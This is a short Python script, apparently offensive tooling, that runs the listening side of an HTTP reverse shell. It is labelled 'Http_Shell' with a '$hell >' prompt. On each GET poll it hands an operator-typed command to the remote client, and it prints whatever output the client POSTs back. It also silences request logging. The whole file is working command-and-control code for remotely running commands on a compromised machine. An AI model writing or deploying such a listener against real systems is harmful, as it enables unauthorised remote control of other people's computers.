import http.server, socketserver, signal

PORT = 8000

GREEN = '\033[38;5;47m'; END = '\033[0m'


class Http_Shell(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        command_input = input(f'{GREEN}$hell > {END}')
        self.wfile.write(bytes(command_input + '\n', "utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        print(post_data.decode())

    def log_message(self, format, *args):
        return

def signal_handler(sig, frame):
    print("Closing server ...")
    httpd.server_close()


with socketserver.TCPServer(("", PORT), Http_Shell) as httpd:
    print("Listening on port", PORT)
    print(" ")
    httpd.serve_forever()
    signal.signal(signal.SIGINT, signal_handler)
